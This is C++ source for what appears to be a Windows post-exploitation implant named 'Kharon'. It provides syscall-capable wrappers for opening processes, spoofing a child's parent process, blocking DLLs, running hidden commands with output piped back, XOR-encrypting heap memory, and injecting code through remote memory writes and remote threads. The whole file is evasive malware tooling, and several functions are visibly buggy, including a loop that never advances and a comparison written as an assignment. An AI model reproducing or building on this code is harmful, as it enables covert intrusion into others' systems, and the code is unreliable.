#include <Kharon.h>

using namespace Root;

auto DECLFN Library::Load(
    _In_ PCHAR LibName
) -> UPTR {
    return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
}

auto DECLFN Heap::Crypt( VOID ) -> VOID {
    PHEAP_NODE Current = Node;

    while ( Current ) {
        if ( Current->Block && Current->Size > 0 ) {
            Self->Usf->Xor( 
                B_PTR( Current->Block ), 
                Current->Size, 
                Key, sizeof( Key ) 
            );
        }
    }
}

auto DECLFN Heap::Alloc(
    _In_ ULONG Size
) -> PVOID {
    PVOID Block = Self->Ntdll.RtlAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Size );

    PHEAP_NODE NewNode = (PHEAP_NODE)Self->Ntdll.RtlAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, sizeof( HEAP_NODE ) );

    NewNode->Block = Block;
    NewNode->Size  = Size;

    if ( !Node ) {
        Node = NewNode;
    } else {
        PHEAP_NODE Current = Node;
        
        while ( Current->Next ) {
            Current = Current->Next;
        } 

        Current->Next = NewNode;
    }
    
    Count++;

    return Block;
}

auto DECLFN Heap::ReAlloc(
    _In_ PVOID Block,
    _In_ ULONG Size
) -> PVOID {
    PVOID ReBlock = Self->Ntdll.RtlReAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Block, Size );

    PHEAP_NODE Current = Node;

    while ( Current ) {
        if ( Current->Block = Block ) {
            Current->Block = ReBlock;
            Current->Size  = Size;
            break;
        }

        Current = Current->Next;
    }

    return ReBlock;
}

auto DECLFN Heap::Free(
    _In_ PVOID Block
) -> BOOL {
    PHEAP_NODE Current  = Node;
    PHEAP_NODE Previous = NULL;
    BOOL       Result   = FALSE;

    while ( Current ) {
        if ( Current->Block == Block ) {
            Mem::Zero( U_PTR( Current->Block ), Current->Size );
            Result = Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Current->Block );

            if ( Previous ) {
                Previous->Next = Current->Next;
            } else {
                Node = Current->Next;
            }

            Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Current );
            Count--;

            break;
        }

        Previous = Current;
        Current  = Current->Next;
    }

    return Result;
}

auto DECLFN Token::GetUser( 
    _Out_ PCHAR *UserNamePtr, 
    _Out_ ULONG *UserNameLen, 
    _In_  HANDLE TokenHandle 
) -> BOOL {
    PTOKEN_USER  TokenUserPtr = NULL;
    SID_NAME_USE SidName      = SidTypeUnknown;
    NTSTATUS     NtStatus     = STATUS_SUCCESS;
    ULONG        TotalLen     = 0;
    ULONG        ReturnLen    = 0;
    PSTR         DomainStr    = NULL;
    ULONG        DomainLen    = 0;
    PSTR         UserStr      = NULL;
    ULONG        UserLen      = 0;
    BOOL         bSuccess     = FALSE;

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
    if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
        goto _KH_END;
    }

    TokenUserPtr = ( PTOKEN_USER )Self->Hp->Alloc( ReturnLen );
    if ( !TokenUserPtr ) {
        goto _KH_END;
    }

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
    if ( !NT_SUCCESS( NtStatus ) ) { goto _KH_END; }

    bSuccess = Self->Advapi32.LookupAccountSidA( 
        NULL, TokenUserPtr->User.Sid, NULL,
        &UserLen, NULL, &DomainLen, &SidName 
    );

    if ( !bSuccess && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
        TotalLen = UserLen + DomainLen + 2; 

        *UserNamePtr = ( PCHAR )Self->Hp->Alloc( TotalLen ); 
        if ( !*UserNamePtr ) { goto _KH_END; }

        DomainStr = *UserNamePtr;
        UserStr   = (*UserNamePtr) + DomainLen;

        bSuccess = Self->Advapi32.LookupAccountSidA( 
            NULL, TokenUserPtr->User.Sid, UserStr,
            &UserLen, DomainStr, &DomainLen, &SidName 
        );

        if ( bSuccess ) {
            (*UserNamePtr)[DomainLen] = '\\';
        } else {
            Self->Hp->Free( *UserNamePtr );
            *UserNamePtr = NULL;
            *UserNameLen = 0;
        }
    }

_KH_END:
    if ( TokenUserPtr ) {
        Self->Hp->Free( TokenUserPtr );
    }
    return bSuccess;
}

auto DECLFN Token::ProcOpen(
    _In_ HANDLE  ProcessHandle,
    _In_ ULONG   RightsAccess,
    _In_ PHANDLE TokenHandle
) -> BOOL {
    return Self->Advapi32.OpenProcessToken( ProcessHandle, RightsAccess, TokenHandle );
}

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    HANDLE Handle = INVALID_HANDLE_VALUE;

    if ( Self->Sys->Enabled ) {
        NTSTATUS          Status   = STATUS_UNSUCCESSFUL;
        OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
        CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };

        Status = Self->Sys->Run( syOpenProc, &Handle, RightsAccess, &ClientID );
        Self->Ntdll.RtlNtStatusToDosError( Status );
    } else {
        Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
    }

    return Handle;
}

auto DECLFN Process::Create(
    _In_  PCHAR                CommandLine,
    _In_  ULONG                PsFlags,
    _Out_ PPROCESS_INFORMATION PsInfo
) -> BOOL {
    ProcThreadAttrList ProcAttr;

    BOOL   Success      = FALSE;
    ULONG  TmpValue     = 0;
    HANDLE PipeWrite    = NULL;
    HANDLE PipeRead     = NULL; 
    PBYTE  PipeBuff     = NULL;
    ULONG  PipeBuffSize = 0;
    UINT8  UpdateCount  = 0;

    STARTUPINFOEXA      SiEx         = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; }
    if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };

    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
    SiEx.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
    SiEx.StartupInfo.wShowWindow = SW_HIDE;

    PsFlags |= CREATE_NO_WINDOW;

    if ( Self->Ps->Ctx.Pipe ) {
        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
        if ( !Success ) { goto _KH_END; }

        Self->Krnl32.SetHandleInformation( PipeWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT );

        SiEx.StartupInfo.hStdError  = PipeWrite;
        SiEx.StartupInfo.hStdOutput = PipeWrite;
        SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
        SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
    }

    if ( UpdateCount             ) ProcAttr.Initialize( UpdateCount );
    if ( Self->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Self->Ps->Ctx.ParentID ) );
    if ( Self->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();

    if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();

    Success = Self->Krnl32.CreateProcessA( 
        NULL, CommandLine, NULL, NULL, TRUE, PsFlags, 
        NULL, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
    );
    if ( !Success ) { goto _KH_END; }

    if ( Self->Ps->Ctx.Pipe ) {
        
        Self->Ntdll.NtClose( PipeWrite ); PipeWrite = NULL;

        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );

        if (waitResult == WAIT_TIMEOUT) {
            KhDbg( "Timeout waiting for process output" );
        }

        Success = Self->Krnl32.PeekNamedPipe( 
            PipeRead, NULL, 0, NULL, &PipeBuffSize, NULL           
        );
        
        if ( !Success ) { goto _KH_END; }

        if ( PipeBuffSize > 0 ) {
            PipeBuff = (PBYTE)Self->Hp->Alloc( PipeBuffSize );
            if ( !PipeBuff ) { goto _KH_END; }
        
            Success = Self->Krnl32.ReadFile( 
                PipeRead, PipeBuff, PipeBuffSize, &TmpValue, NULL 
            );
            if ( !Success ) { goto _KH_END; }
        
            Self->Pkg->Bytes( GLOBAL_PKG, PipeBuff, TmpValue );
            
        } else {
            KhDbg( "No data available in pipe" );
        }
    }
 
_KH_END:
    if ( PipeBuff  ) Self->Hp->Free( PipeBuff );
    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );

    return Success;
}

#define ALL_THREADS 0x05

auto DECLFN Thread::Enum( 
    _In_      INT8  Type,
    _In_opt_  ULONG ProcessID,
    _In_opt_  ULONG Flags,
    _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
) -> ULONG {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
    PVOID                       ValToFree     = NULL;
    ULONG                       bkErrorCode   =  0;
    ULONG                       ReturnLen     = 0;
    ULONG                       RandomNumber  = 0;
    ULONG                       ThreadID      = 0;
    BOOL                        bkSuccess     = FALSE;

    Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
    ValToFree   = SysProcInfo;

    bkErrorCode = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
    if ( bkErrorCode ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

    while( 1 ) {
        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Self->Session.ProcessID ) ) {
            SysThreadInfo = SysProcInfo->Threads;

            for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( Type == TdRandom ) {
                    if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
                        ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
                    }    
                }
            }
        }

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

_KH_END:
    if ( SysProcInfo ) Self->Hp->Free( ValToFree );

    return ThreadID;
}

auto DECLFN Thread::Create(
    _In_  HANDLE ProcessHandle,
    _In_  PVOID  StartAddress,
    _In_  PVOID  Parameter,
    _In_  ULONG  StackSize,
    _In_  ULONG  Flags,
    _Out_ PULONG ThreadID
) -> HANDLE {
    HANDLE Handle = INVALID_HANDLE_VALUE;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;

        if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) ProcessHandle = NtCurrentProcess();

        Status = Self->Sys->Run( syCrThread, &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
        Self->Usf->NtStatusToError( Status );
    } else {
        if ( ProcessHandle ) {
            Handle = Self->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
        } else {
            Handle = Self->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
        }
    }    

    return Handle;
}

auto DECLFN Thread::Open(
    _In_ ULONG RightAccess,
    _In_ BOOL  Inherit,
    _In_ ULONG ThreadID
) -> HANDLE {
    return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
}

auto DECLFN Memory::Read(
    _In_  HANDLE  Handle,
    _In_  PVOID   Base,
    _In_  PBYTE   Buffer,
    _In_  SIZE_T  Size,
    _Out_ PSIZE_T Reads
) -> BOOL {
    return Self->Krnl32.ReadProcessMemory( Handle, Base, Buffer, Size, Reads );
}

auto DECLFN Memory::Alloc(
    _In_ HANDLE Handle,
    _In_ PVOID Base,
    _In_ ULONG Size,
    _In_ ULONG AllocType,
    _In_ ULONG Protect
) -> PVOID {
    PVOID BaseAddress = NULL;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;
        PVOID    TmpPtr = Base;

        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();

        Status = Self->Sys->Run( syAlloc, Handle, &TmpPtr, 0, &Size, AllocType, Protect );
        BaseAddress = TmpPtr;
        Self->Usf->NtStatusToError( Status );
    } else {
        if ( Handle ) {
            BaseAddress = Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
        } else {
            BaseAddress = Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
        }
    }
    
    return BaseAddress;
}

auto DECLFN Memory::Protect(
    _In_  HANDLE Handle,
    _In_  PVOID  Base,
    _In_  ULONG  Size,
    _In_  ULONG  NewProt,
    _Out_ PULONG OldProt
) -> BOOL {
    BOOL Success = FALSE;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;

        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();

        Status = Self->Sys->Run( syProtect, Handle, Handle, Base, Size, NewProt, OldProt );
        Self->Usf->NtStatusToError( Status );

        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
        else   Success = FALSE; 
    } else {
        if ( Handle ) {
            Success = Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
        } else {
            Success = Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
        }
    }
    
    return Success;
}

auto DECLFN Memory::Write(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ PBYTE  Buffer,
    _In_ ULONG  Size
) -> BOOL {
    BOOL      Success = FALSE;
    ULONG_PTR Written = 0;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;

        Status = Self->Sys->Run( syWrite, Handle, Base, Buffer, Size, &Written );
        Self->Usf->NtStatusToError( Status );

        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
        else   Success = FALSE; 
    } else {
        Success = Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
    }
    
}

auto DECLFN Memory::Free(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ ULONG  Size,
    _In_ ULONG  FreeType
) -> BOOL {
    if ( !Handle ) {
        return Self->Krnl32.VirtualFree( Base, Size, FreeType );
    } else {
        return Self->Krnl32.VirtualFreeEx( Handle, Base, Size, FreeType );
    }
}
 